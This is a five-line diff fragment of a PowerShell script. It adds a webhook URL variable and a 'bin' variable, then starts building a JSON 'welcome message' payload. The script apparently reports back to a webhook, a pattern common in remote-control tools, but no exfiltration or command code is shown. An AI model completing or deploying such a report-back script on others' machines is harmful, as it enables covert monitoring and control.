@@ -1,5 +1,8 @@
 Add-Type -AssemblyName System.Windows.Forms
 
+$hookurl = "$hk" 
+$bin = "$bn"
+
 #Welcome message
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 $jsonPayload = @{
